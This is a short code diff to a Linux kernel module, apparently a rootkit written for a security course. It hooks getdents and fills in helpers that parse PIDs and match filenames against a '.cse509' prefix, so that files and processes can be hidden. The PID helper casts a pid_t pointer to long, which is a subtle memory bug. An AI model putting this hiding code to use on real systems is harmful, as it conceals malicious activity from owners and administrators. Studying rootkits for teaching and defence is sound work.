@@ -24,7 +24,7 @@ typedef unsigned int pointer_size_t;
 unsigned int **syscall_table;
 #endif
 
-
+#define HIDE_PREFIX ".cse509"
 #define BUFSIZE 32768
 
 struct linux_dirent {
@@ -51,7 +51,6 @@ struct hidden_pids_struct hidden_pids;
 
 /* pid of the process that has currently opened '/proc/' */
 pid_t proc_open_pid;
-
 /* fd for opened '/proc/' in this process open_files table */
 int proc_open_fd;
 
@@ -233,7 +232,14 @@ out:
  */
 pid_t get_pid_from_str(const char *str)
 {
-    // TODO
+    int err;
+    pid_t ret;
+    
+    err = kstrtol(str, 10, (long *) &ret);
+    if (err)
+        ret = -1;
+
+    return ret;
 }
 
 /*
@@ -243,7 +249,7 @@ pid_t get_pid_from_str(const char *str)
  */
 int filename_matches_pattern(const char *filename)
 {
-    // TODO
+    return strncmp(filename, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0;
 }
 
 asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
